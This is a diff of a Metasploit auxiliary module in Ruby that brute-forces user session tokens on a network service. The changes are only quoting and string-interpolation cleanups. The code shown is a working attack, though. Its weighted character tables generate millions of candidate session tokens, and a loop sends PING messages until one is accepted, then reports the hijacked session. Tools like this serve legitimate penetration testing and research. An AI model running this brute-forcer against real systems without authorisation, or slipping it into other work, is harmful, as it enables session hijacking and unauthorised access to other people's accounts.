@@ -47,24 +47,24 @@ class MetasploitModule < Msf::Auxiliary
   # 2621440 total combinations for both 1.X and 2.X versions
   # 2.X versions only have 1048576 combinations, and this table will run through them first
   WEIGHTED_ARRAY_7 =
-    ["2", "1"],
-    ["4", "6", "5", "7", "8", "2", "0", "1", "f", "e"],
-    ["1", "6", "0", "8", "d", "7", "c", "e", "2", "b", "f", "3", "5", "4", "a", "9"],
-    ["d", "6", "4", "5", "f", "0", "8", "7", "a", "3", "1", "b", "c", "e", "9", "2"],
-    ["3", "e", "f", "1", "c", "5", "9", "d", "8", "6", "0", "4", "a", "2", "b", "7"],
-    ["d", "4", "2", "b", "3", "6", "8", "1", "a", "7", "f", "e", "0", "9", "5", "c"],
-    ["8", "0"]
+    ['2', '1'],
+    ['4', '6', '5', '7', '8', '2', '0', '1', 'f', 'e'],
+    ['1', '6', '0', '8', 'd', '7', 'c', 'e', '2', 'b', 'f', '3', '5', '4', 'a', '9'],
+    ['d', '6', '4', '5', 'f', '0', '8', '7', 'a', '3', '1', 'b', 'c', 'e', '9', '2'],
+    ['3', 'e', 'f', '1', 'c', '5', '9', 'd', '8', '6', '0', '4', 'a', '2', 'b', '7'],
+    ['d', '4', '2', 'b', '3', '6', '8', '1', 'a', '7', 'f', 'e', '0', '9', '5', 'c'],
+    ['8', '0']
 
   # 189000 total combinations
   # Only tested (only applies?) to 2.X versions
   # These are only tried if WEIGHTED_ARRAY_7 fails
   WEIGHTED_ARRAY_6 =
-    ["9", "a"],
-    ["7", "c", "6", "f", "e", "a", "d", "9", "4", "5", "3", "2", "b", "0", "8"],
-    ["7", "b", "6", "d", "a", "3", "4", "f", "5", "1", "8", "e", "c", "2"],
-    ["3", "1", "c", "f", "d", "4", "b", "a", "6", "2", "5", "e", "8", "9", "0"],
-    ["3", "6", "7", "b", "e", "9", "2", "f", "4", "1", "c", "a", "0", "d", "8"],
-    ["0", "8"]
+    ['9', 'a'],
+    ['7', 'c', '6', 'f', 'e', 'a', 'd', '9', '4', '5', '3', '2', 'b', '0', '8'],
+    ['7', 'b', '6', 'd', 'a', '3', '4', 'f', '5', '1', '8', 'e', 'c', '2'],
+    ['3', '1', 'c', 'f', 'd', '4', 'b', 'a', '6', '2', '5', 'e', '8', '9', '0'],
+    ['3', '6', '7', 'b', 'e', '9', '2', 'f', '4', '1', 'c', 'a', '0', 'd', '8'],
+    ['0', '8']
 
 
   def session_number_list(weighted_array)
@@ -82,7 +82,7 @@ class MetasploitModule < Msf::Auxiliary
       total *= len.to_i
     end
 
-    print_status("Generating " + total.to_s + " session tokens")
+    print_status("Generating #{total} session tokens")
     final_list = Array.new
 
     # code below taken from https://gist.github.com/Yengas/9010715
@@ -119,7 +119,7 @@ class MetasploitModule < Msf::Auxiliary
     list = session_number_list(weighted_array)
     for session in list
       @nucs_session = session
-      data = nucs_send_msg(["PING"])
+      data = nucs_send_msg(['PING'])
       @counter += 1
       if data[0] =~ /OK/ || data[0] =~ /612/
         return session
@@ -130,20 +130,20 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     @counter = 0
-    print_status("Bruteforcing session - this might take a while, go get some coffee!")
+    print_status('Bruteforcing session - this might take a while, go get some coffee!')
     session = nil
     time = Benchmark.realtime {
       session = session_bruteforce_list(WEIGHTED_ARRAY_7)
       if session == nil
-        print_error("Failed to bruteforce, trying with the less likely numbers as a last resort...")
+        print_error('Failed to bruteforce, trying with the less likely numbers as a last resort...')
         session = session_bruteforce_list(WEIGHTED_ARRAY_6)
       end
     }
     if session == nil
-      fail_with(Failure::Unknown, "Failed to bruteforce user session.")
+      fail_with(Failure::Unknown, 'Failed to bruteforce user session.')
     else
-      print_good("Found valid user session: #{session.to_s}")
-      print_status("Time taken: #{time.to_s} seconds; total tries #{@counter.to_s}")
+      print_good("Found valid user session: #{session}")
+      print_status("Time taken: #{time} seconds; total tries #{@counter}")
     end
   end
 end
